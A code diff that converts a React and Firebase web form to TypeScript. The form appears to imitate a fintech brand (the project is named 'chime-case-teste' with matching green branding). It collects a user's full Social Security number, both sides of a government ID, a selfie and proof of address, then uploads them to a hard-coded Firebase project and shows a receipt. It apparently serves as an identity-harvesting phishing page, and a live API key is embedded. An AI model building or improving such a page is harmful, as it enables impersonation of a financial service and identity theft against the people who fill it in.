@@ -1,11 +1,12 @@
 import React, { useState, useRef, useEffect } from 'react';
-import { Camera, Check, Shield, Lock, ChevronRight, AlertCircle, Menu, X, User, Loader2, FileText, ExternalLink } from 'lucide-react';
+import { Camera, Check, Shield, Lock, ChevronRight, AlertCircle, Menu, X, User as UserIcon, Loader2, FileText, ExternalLink } from 'lucide-react';
 import { initializeApp } from 'firebase/app';
-import { getFirestore, collection, addDoc, serverTimestamp } from 'firebase/firestore';
-import { getAuth, signInAnonymously, onAuthStateChanged } from 'firebase/auth';
-import { getStorage, ref, uploadBytes, getDownloadURL } from 'firebase/storage';
+// ADICIONADO "type" NAS IMPORTAÇÕES ABAIXO PARA CORRIGIR O ERRO
+import { getFirestore, collection, addDoc, serverTimestamp, type Firestore } from 'firebase/firestore';
+import { getAuth, signInAnonymously, onAuthStateChanged, type Auth, type User } from 'firebase/auth';
+import { getStorage, ref, uploadBytes, getDownloadURL, type FirebaseStorage } from 'firebase/storage';
 
-// --- SUA CONFIGURAÇÃO (Já preenchi com base na sua foto) ---
+// --- SUA CONFIGURAÇÃO ---
 const firebaseConfig = {
   apiKey: "AIzaSyAuITAkLq7XNhJd1AuOrXTXeqqjS8nG2ss",
   authDomain: "chime-case-teste.firebaseapp.com",
@@ -16,8 +17,12 @@ const firebaseConfig = {
   measurementId: "G-8B4QLXJWJB"
 };
 
-// Inicialização segura
-let app, auth, db, storage;
+// Inicialização segura com tipagem
+let app;
+let auth: Auth | undefined;
+let db: Firestore | undefined;
+let storage: FirebaseStorage | undefined;
+
 try {
   if (firebaseConfig.apiKey) {
     app = initializeApp(firebaseConfig);
@@ -31,11 +36,54 @@ try {
 
 const BRAND = { green: '#00C865', darkGreen: '#004F2D', lightBg: '#F2F8F5' };
 
+// Interfaces para TypeScript
+interface FileData {
+  name: string;
+  url: string;
+}
+
+interface FormDataState {
+  ssn: string;
+  idFront: File | null;
+  idBack: File | null;
+  selfie: File | null;
+  proofAddress: File | null;
+}
+
+interface SubmittedDataType {
+  userId: string;
+  ssn_masked: string;
+  status: string;
+  submittedAt: string;
+  documents: {
+    idFront: FileData | null;
+    idBack: FileData | null;
+    selfie: FileData | null;
+    proofAddress: FileData | null;
+  };
+}
+
+interface FileUploadFieldProps {
+  label: string;
+  id: keyof FormDataState;
+  file: File | null;
+  onFileChange: (id: keyof FormDataState, file: File) => void;
+  icon?: React.ReactNode;
+}
+
 // Componente de Upload
-const FileUploadField = ({ label, id, file, onFileChange, icon }) => {
-  const inputRef = useRef(null);
-  const handleClick = () => inputRef.current.click();
-  const handleChange = (e) => { if (e.target.files && e.target.files[0]) onFileChange(id, e.target.files[0]); };
+const FileUploadField: React.FC<FileUploadFieldProps> = ({ label, id, file, onFileChange, icon }) => {
+  const inputRef = useRef<HTMLInputElement>(null);
+  
+  const handleClick = () => {
+    inputRef.current?.click();
+  };
+
+  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
+    if (e.target.files && e.target.files[0]) {
+      onFileChange(id, e.target.files[0]);
+    }
+  };
 
   return (
     <div className="mb-4">
@@ -62,10 +110,16 @@ const FileUploadField = ({ label, id, file, onFileChange, icon }) => {
 
 export default function App() {
   const [step, setStep] = useState(1);
-  const [submittedData, setSubmittedData] = useState(null);
-  const [formData, setFormData] = useState({ ssn: '', idFront: null, idBack: null, selfie: null, proofAddress: null });
+  const [submittedData, setSubmittedData] = useState<SubmittedDataType | null>(null);
+  const [formData, setFormData] = useState<FormDataState>({ 
+    ssn: '', 
+    idFront: null, 
+    idBack: null, 
+    selfie: null, 
+    proofAddress: null 
+  });
   const [isMenuOpen, setIsMenuOpen] = useState(false);
-  const [user, setUser] = useState(null);
+  const [user, setUser] = useState<User | null>(null);
   const [isSubmitting, setIsSubmitting] = useState(false);
   const [uploadStatus, setUploadStatus] = useState('');
   const [errorMsg, setErrorMsg] = useState('');
@@ -78,7 +132,7 @@ export default function App() {
         console.log("Usuário conectado:", u.uid);
         setUser(u);
       } else {
-        signInAnonymously(auth).catch((e) => {
+        signInAnonymously(auth!).catch((e) => {
             console.error(e);
             setErrorMsg("Connection error: Verifique se 'Autenticação Anônima' está ativada no Firebase.");
         });
@@ -87,9 +141,11 @@ export default function App() {
     return () => unsubscribe();
   }, []);
 
-  const handleFileChange = (fieldId, file) => setFormData(prev => ({ ...prev, [fieldId]: file }));
+  const handleFileChange = (fieldId: keyof FormDataState, file: File) => {
+    setFormData(prev => ({ ...prev, [fieldId]: file }));
+  };
   
-  const handleSSNChange = (e) => {
+  const handleSSNChange = (e: React.ChangeEvent<HTMLInputElement>) => {
     let value = e.target.value.replace(/\D/g, '');
     if (value.length > 9) value = value.slice(0, 9);
     if (value.length > 5) value = `${value.slice(0, 3)}-${value.slice(3, 5)}-${value.slice(5)}`;
@@ -97,17 +153,17 @@ export default function App() {
     setFormData(prev => ({ ...prev, ssn: value }));
   };
 
-  const uploadFile = async (file, path) => {
-    if (!file) return null;
+  const uploadFile = async (file: File | null, path: string): Promise<FileData | null> => {
+    if (!file || !storage) return null;
     const storageRef = ref(storage, path);
     const snapshot = await uploadBytes(storageRef, file);
     const url = await getDownloadURL(snapshot.ref);
     return { name: file.name, url: url };
   };
 
-  const handleSubmit = async (e) => {
+  const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
-    if (!user) {
+    if (!user || !db) {
         setErrorMsg("Aguardando conexão com o servidor... Tente novamente em 5 segundos.");
         return;
     }
@@ -119,30 +175,35 @@ export default function App() {
       const basePath = `submissions/${user.uid}/${timestamp}`;
       
       setUploadStatus('Uploading ID Front...');
-      const idFrontData = await uploadFile(formData.idFront, `${basePath}_front_${formData.idFront.name}`);
+      const idFrontData = await uploadFile(formData.idFront, `${basePath}_front_${formData.idFront?.name}`);
       
       setUploadStatus('Uploading ID Back...');
-      const idBackData = await uploadFile(formData.idBack, `${basePath}_back_${formData.idBack.name}`);
+      const idBackData = await uploadFile(formData.idBack, `${basePath}_back_${formData.idBack?.name}`);
       
       setUploadStatus('Uploading Selfie...');
-      const selfieData = await uploadFile(formData.selfie, `${basePath}_selfie_${formData.selfie.name}`);
+      const selfieData = await uploadFile(formData.selfie, `${basePath}_selfie_${formData.selfie?.name}`);
       
       setUploadStatus('Uploading Proof of Address...');
-      const proofData = await uploadFile(formData.proofAddress, `${basePath}_proof_${formData.proofAddress.name}`);
+      const proofData = await uploadFile(formData.proofAddress, `${basePath}_proof_${formData.proofAddress?.name}`);
       
       setUploadStatus('Finalizing...');
-      // Convertendo timestamp para string para exibição imediata
-      const payload = { 
+      
+      const payload: SubmittedDataType = { 
         userId: user.uid, 
         ssn_masked: `***-**-${formData.ssn.slice(-4)}`, 
         status: 'pending_review', 
         submittedAt: new Date().toISOString(), 
-        documents: { idFront: idFrontData, idBack: idBackData, selfie: selfieData, proofAddress: proofData } 
+        documents: { 
+          idFront: idFrontData, 
+          idBack: idBackData, 
+          selfie: selfieData, 
+          proofAddress: proofData 
+        } 
       };
       
       await addDoc(collection(db, 'applications'), {
           ...payload,
-          submittedAt: serverTimestamp() // Salva timestamp real no banco
+          submittedAt: serverTimestamp() 
       });
       
       setSubmittedData(payload);
@@ -158,30 +219,31 @@ export default function App() {
 
   const isFormValid = formData.ssn.length === 11 && formData.idFront && formData.idBack && formData.selfie && formData.proofAddress;
 
-  if (step === 2) return (
+  if (step === 2 && submittedData) return (
     <div className="min-h-screen bg-[#F2F8F5] flex flex-col items-center justify-center p-6 text-center font-sans">
       <div className="bg-white p-8 rounded-2xl shadow-xl max-w-md w-full border border-green-100">
         <div className="w-20 h-20 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-6"><Check className="w-10 h-10 text-[#00C865]" strokeWidth={3} /></div>
         <h2 className="text-2xl font-bold text-gray-900 mb-2">Application Received!</h2>
         <p className="text-gray-600 mb-6 text-sm">We have received your documents. See receipt below.</p>
         
-        {submittedData && (
-          <div className="bg-gray-50 rounded-lg p-4 mb-6 text-left border border-gray-200">
-            <h4 className="text-xs font-bold text-gray-500 uppercase tracking-wider mb-3">Submission Receipt</h4>
-            <div className="space-y-3">
-              <div className="flex justify-between text-sm"><span className="text-gray-600">SSN:</span><span className="font-mono text-gray-800">{submittedData.ssn_masked}</span></div>
-              <div className="border-t border-gray-200 my-2 pt-2">
-                <p className="text-xs text-gray-400 mb-2">Uploaded Files (Click to verify):</p>
-                {Object.entries(submittedData.documents).map(([key, file]) => (
+        <div className="bg-gray-50 rounded-lg p-4 mb-6 text-left border border-gray-200">
+          <h4 className="text-xs font-bold text-gray-500 uppercase tracking-wider mb-3">Submission Receipt</h4>
+          <div className="space-y-3">
+            <div className="flex justify-between text-sm"><span className="text-gray-600">SSN:</span><span className="font-mono text-gray-800">{submittedData.ssn_masked}</span></div>
+            <div className="border-t border-gray-200 my-2 pt-2">
+              <p className="text-xs text-gray-400 mb-2">Uploaded Files (Click to verify):</p>
+              {Object.entries(submittedData.documents).map(([key, file]) => (
+                file && (
                   <a key={key} href={file.url} target="_blank" rel="noopener noreferrer" className="flex items-center justify-between p-2 hover:bg-white rounded border border-transparent hover:border-gray-200 cursor-pointer group">
                     <div className="flex items-center"><FileText className="w-4 h-4 text-gray-400 mr-2" /><span className="text-xs text-gray-600 capitalize">{key}</span></div>
                     <ExternalLink className="w-3 h-3 text-gray-400 group-hover:text-green-600" />
                   </a>
-                ))}
-              </div>
+                )
+              ))}
             </div>
           </div>
-        )}
+        </div>
+        
         <button className="w-full bg-[#00C865] text-white font-bold py-4 rounded-xl shadow-lg" onClick={() => window.location.reload()}>New Application</button>
       </div>
     </div>
@@ -204,7 +266,7 @@ export default function App() {
             <div><h3 className="text-md font-bold text-gray-800 mb-4">Document Upload</h3>
               <FileUploadField label="Government ID (Front)" id="idFront" file={formData.idFront} onFileChange={handleFileChange} />
               <FileUploadField label="Government ID (Back)" id="idBack" file={formData.idBack} onFileChange={handleFileChange} />
-              <div className="my-6 p-4 bg-green-50 rounded-xl border border-green-100"><FileUploadField label="Selfie Verification" id="selfie" file={formData.selfie} onFileChange={handleFileChange} icon={<User className="w-6 h-6 text-gray-500" />} /></div>
+              <div className="my-6 p-4 bg-green-50 rounded-xl border border-green-100"><FileUploadField label="Selfie Verification" id="selfie" file={formData.selfie} onFileChange={handleFileChange} icon={<UserIcon className="w-6 h-6 text-gray-500" />} /></div>
               <FileUploadField label="Proof of Residence" id="proofAddress" file={formData.proofAddress} onFileChange={handleFileChange} />
             </div>
             {errorMsg && <div className="bg-red-50 text-red-600 text-sm p-3 rounded-lg flex items-center justify-center"><AlertCircle className="w-4 h-4 mr-2" /> {errorMsg}</div>}
